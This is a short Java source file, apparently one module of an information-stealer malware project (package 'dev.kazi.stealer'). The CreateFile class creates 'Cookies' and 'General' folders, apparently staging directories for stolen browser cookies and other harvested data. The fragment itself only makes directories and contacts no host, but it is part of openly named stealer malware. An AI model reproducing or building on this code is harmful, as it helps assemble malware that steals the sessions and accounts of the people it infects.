package dev.kazi.stealer.node.nodes.file;

import java.io.File;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class CreateFile extends Node {

    public CreateFile() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        final File cookiePath = new File(this.getFolder() + "\\Cookies");
        final File generalPath = new File(this.getFolder() + "\\General");
        if (!cookiePath.exists()) {
            cookiePath.mkdir();
        }
        if (!generalPath.exists()) {
            generalPath.mkdir();
        }
    }
}
